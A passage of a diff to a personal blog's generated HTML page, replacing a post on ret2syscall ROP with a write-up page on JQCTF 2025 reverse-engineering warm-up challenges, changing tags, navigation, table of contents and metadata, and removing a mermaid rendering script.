         class="article-tag-list-link"
-        href="/tags/pwn"
+        href="/tags/%e9%80%86%e5%90%91"
         rel="tag"
-        >PWN</a
+        >逆向</a
       >
     </li>
   
     <li class="article-tag-list-item" data-aos="zoom-in">
       <a
         class="article-tag-list-link"
-        href="/tags/%e5%9f%ba%e7%a1%80%e7%90%86%e8%ae%ba"
+        href="/tags/%e7%ba%bf%e4%b8%8a%e8%b5%9b"
         rel="tag"
-        >基础理论</a
+        >线上赛</a
       >
     </li>
   
@@ -762,44 +712,23 @@ CTF-Wiki-ret2syscall
           
           
             <img
-              data-src="/images/my/4.jpg"
+              data-src="/images/my/12.png"
               data-sizes="auto"
-              alt="Ret2libc(未完成)"
+              alt="攻防世界 Reverse"
               class="lazyload"
             />
           
         
-        <a href="/post/ret2libc/"></a>
+        <a href="/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-reverse/"></a>
         <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">
           
-            Ret2libc(未完成)
+            攻防世界 Reverse
           
         </h3>
       </div>
     
 
-    
-      <div class="article-nav-link-wrap article-nav-link-right">
-        
-          
-          
-            <img
-              data-src="/images/my/18.jpg"
-              data-sizes="auto"
-              alt="Pwn"
-              class="lazyload"
-            />
-          
-        
-        <a href="/post/buuctf-pwn/"></a>
-        <div class="article-nav-caption">后一篇</div>
-        <h3 class="article-nav-title">
-          
-            Pwn
-          
-        </h3>
-      </div>
     
   </nav>
 
@@ -939,20 +868,16 @@ CTF-Wiki-ret2syscall
   <div class="sidebar-toc-wrapper toc-div-class">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#前置知识">前置知识</a>
+    <li><a href="#第三届京麒ctf-jqctf-2025-热身赛-re1">第三届京麒CTF-JQCTF-2025-热身赛-re1</a>
       <ul>
-        <li><a href="#system函数">system()函数</a></li>
+        <li><a href="#分析">分析</a></li>
+        <li><a href="#exp">exp</a></li>
       </ul>
     </li>
-    <li><a href="#ropreturn-oriented-programming-返回导向编程">ROP(Return-Oriented Programming)-返回导向编程</a>
+    <li><a href="#第三届京麒ctf-jqctf-2025-热身赛-re2">第三届京麒CTF-JQCTF-2025-热身赛-re2</a>
       <ul>
-        <li><a href="#gadget">gadget</a></li>
-        <li><a href="#构造rop链">构造ROP链</a></li>
-      </ul>
-    </li>
-    <li><a href="#举例">举例</a>
-      <ul>
-        <li><a href="#ctf-wiki-ret2syscall">CTF-Wiki-ret2syscall</a></li>
+        <li><a href="#分析-1">分析</a></li>
+        <li><a href="#exp-1">exp</a></li>
       </ul>
     </li>
   </ul>
@@ -1349,133 +1274,13 @@ CTF-Wiki-ret2syscall
       <script data-pjax>
         window.REIMU_POST = {
           author: "Cyzrjz",
-          title: "Ret2syscall",
-          url: "https:\/\/cyzrjz.github.io\/post\/ret2syscall\/",
-          description: "基础ROP",
+          title: "JQCTF2025",
+          url: "https:\/\/cyzrjz.github.io\/post\/jqctf2025\/",
+          description: " 第三届京麒CTF-JQCTF-2025-热身赛-re1 JQCTF2025-热身赛-re1\n分析 Rust逆向,头一回见,直接拖入IDA分析\n函数看起来都很奇怪,动态调试看看 运行到这个call时，提示输入字符串，然后输入后终端输出err,说明所有的判断或加密都在这个call里，步入看看 到这里再按F5反编译,就是用户函数了\n",
           cover: "https:\/\/cyzrjz.github.io\/images\/my\/banner.png",
         };
       </script>
     
-    
-      
-
-  
-  
-    
-  
-  
-  
-  
-  
-  
-  
-  <script
-    src="https://npm.webcache.cn/mermaid@9.4.3/dist/mermaid.min.js"
-    
-    
-    data-pjax
-    
-    integrity="sha384-aG3Gai4tbCHF0iXo48HwLoOZyut7mBl50oMC9GD1m75xyHfJDv6w8hD/kZRD47aJ" crossorigin="anonymous"
-  ></script>
-
-
-      
-
-  
-  
-    
-  
-  
-  
-  
-  
-  
-  
-  <script
-    src="https://npm.webcache.cn/dompurify@3.2.4/dist/purify.min.js"
-    
-    
-    data-pjax
-    
-    integrity="sha384-eEu5CTj3qGvu9PdJuS&#43;YlkNi7d2XxQROAFYOr59zgObtlcux1ae1Il3u7jvdCSWu" crossorigin="anonymous"
-  ></script>
-
-
-      <script data-pjax>
-        if (window.mermaid) {
-          
-          const elementCode = ".mermaid";
-          const saveOriginalData = () => {
-            return new Promise((resolve, reject) => {
-              try {
-                var els = _$$(elementCode),
-                  count = els.length;
-                els.forEach((element) => {
-                  if (element.getAttribute("data-original-code") == null) {
-                    element.setAttribute(
-                      "data-original-code",
-                      element.innerHTML,
-                    );
-                  }
-                  count--;
-                  if (count == 0) {
-                    resolve();
-                  }
-                });
-              } catch (error) {
-                reject(error);
-              }
-            });
-          };
-          const resetProcessed = () => {
-            return new Promise((resolve, reject) => {
-              try {
-                var els = _$$(elementCode),
-                  count = els.length;
-                els.forEach((element) => {
-                  if (element.getAttribute("data-original-code") != null) {
-                    element.removeAttribute("data-processed");
-                    element.innerHTML = DOMPurify.sanitize(element.getAttribute("data-original-code"));
-                  }
-                  count--;
-                  if (count == 0) {
-                    resolve();
-                  }
-                });
-              } catch (error) {
-                reject(error);
-              }
-            });
-          };
-          const loadMermaid = (theme) => {
-            window.mermaid.initialize({ theme });
-            window.mermaid.init({ theme }, _$$(elementCode));
-          };
-          document.body.addEventListener("dark-theme-set", () => {
-            saveOriginalData()
-              .then(resetProcessed())
-              .then(loadMermaid("dark"))
-              .catch(console.error);
-          });
-          document.body.addEventListener("light-theme-set", () => {
-            saveOriginalData()
-              .then(resetProcessed())
-              .then(loadMermaid("default"))
-              .catch(console.error);
-          });
-          if (localStorage.getItem("dark_mode") == "true") {
-            saveOriginalData()
-              .then(resetProcessed())
-              .then(loadMermaid("dark"))
-              .catch(console.error);
-          } else {
-            saveOriginalData()
-              .then(resetProcessed())
-              .then(loadMermaid("default"))
-              .catch(console.error);
-          }
-        }
-      </script>
     
     
       
